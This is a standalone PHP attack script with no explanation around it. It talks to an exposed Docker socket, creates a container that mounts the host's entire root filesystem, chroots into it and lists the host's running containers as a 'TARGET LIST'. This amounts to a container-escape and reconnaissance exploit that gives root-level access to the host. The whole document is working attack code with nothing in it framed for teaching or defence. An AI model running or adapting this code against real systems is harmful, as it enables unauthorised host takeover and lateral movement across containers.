<?php
echo "[*] Scanning all running containers on the Host...\n";
$sock = socket_create(AF_UNIX, SOCK_STREAM, 0);
socket_connect($sock, "/var/run/docker.sock");

$payload = json_encode([
    "Image" => "ubuntu:latest", 
    "Cmd" => ["sh", "-c", "chroot /host_root docker ps --format '{{.ID}} | {{.Names}} | {{.Image}}'"], 
    "HostConfig" => ["Binds" => ["/:/host_root"]]
]);

$req = "POST /v1.41/containers/create HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: " . strlen($payload) . "\r\n\r\n" . $payload;
socket_write($sock, $req);

$res = "";
while ($buf = socket_read($sock, 2048)) {
    $res .= $buf;
    if (strpos($res, '"Id":"') !== false) break;
}
preg_match('/"Id":"([^"]+)"/', $res, $matches);
$id = $matches[1];

socket_write($sock, "POST /v1.41/containers/$id/start HTTP/1.1\r\nHost: localhost\r\n\r\n");
socket_read($sock, 2048);
sleep(2);

echo "\n--- TARGET LIST ---\n";
socket_write($sock, "GET /v1.41/containers/$id/logs?stdout=true HTTP/1.1\r\nHost: localhost\r\n\r\n");
while($out = socket_read($sock, 2048)) {
    echo $out;
}
echo "----------------------\n";
?>
